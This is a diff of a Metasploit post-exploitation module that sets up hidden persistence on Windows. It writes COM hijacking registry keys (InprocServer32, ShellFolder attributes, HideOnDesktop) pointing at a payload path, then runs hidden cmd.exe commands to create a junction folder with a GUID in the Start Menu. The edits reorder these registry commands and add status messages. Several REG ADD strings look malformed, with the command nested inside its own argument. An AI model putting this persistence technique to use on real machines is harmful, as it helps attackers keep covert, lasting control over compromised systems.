@@ -122,7 +122,6 @@ class MetasploitModule < Msf::Post
 				{
                                          'SESSION' => '1',                                 # Default its to run againts session 1
                                          'APPL_PATH' => 'C:\\Windows\\System32\\calc.exe', # Default appl (payload) to run
-                                         'FOLDER_PATH' => '%AppData%\\Microsoft\\Windows\\"Start Menu"\\Programs\\Accessories\\POC',
 				},
                         'SessionTypes'   => [ 'meterpreter' ]
  
@@ -240,11 +239,11 @@ def run
        print_status("Persiste in explorer.exe selected ..")
        Rex::sleep(1.0)
        hacks = [
-        'REG ADD "REG ADD #{hive_key}\\#{new_GUID}\\InprocServer32 /v ThreadingModel /t REG_SZ /d Apartment" /f',
-        'REG ADD "REG ADD #{hive_key}\\#{new_GUID}\\InprocServer32 /v LoadWithoutCOM /t REG_SZ /d" /f',
         'REG ADD "REG ADD #{hive_key}\\#{new_GUID}\\InprocServer32 /ve /t REG_SZ /d #{app_path}" /f',
-        'REG ADD "REG ADD #{hive_key}\\#{new_GUID}\\ShellFolder /v HideOnDesktop /t REG_SZ /d" /f',
+        'REG ADD "REG ADD #{hive_key}\\#{new_GUID}\\InprocServer32 /v LoadWithoutCOM /t REG_SZ /d" /f',
+        'REG ADD "REG ADD #{hive_key}\\#{new_GUID}\\InprocServer32 /v ThreadingModel /t REG_SZ /d Apartment" /f',
         'REG ADD "REG ADD #{hive_key}\\#{new_GUID}\\ShellFolder /v Attributes /t REG_DWORD /d 0xf090013d" /f',
+        'REG ADD "REG ADD #{hive_key}\\#{new_GUID}\\ShellFolder /v HideOnDesktop /t REG_SZ /d" /f',
         'RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True'
        ]
      else
@@ -280,6 +279,8 @@ def run
          if datastore['PERSIST_EXPLORER'] == true
            r=''
            print_status("Creating juntion shell folder ..")
+           Rex::sleep(1.0)
+           print_warning("Revert folder path to: %AppData%\\..\\Start Menu\\..")
            Rex::sleep(1.0)
            folder_poc ="mkdir \"%AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories\\POC.#{new_GUID}\""
            r = session.sys.process.execute("cmd.exe /R #{folder_poc}", nil, {'Hidden' => true, 'Channelized' => true})
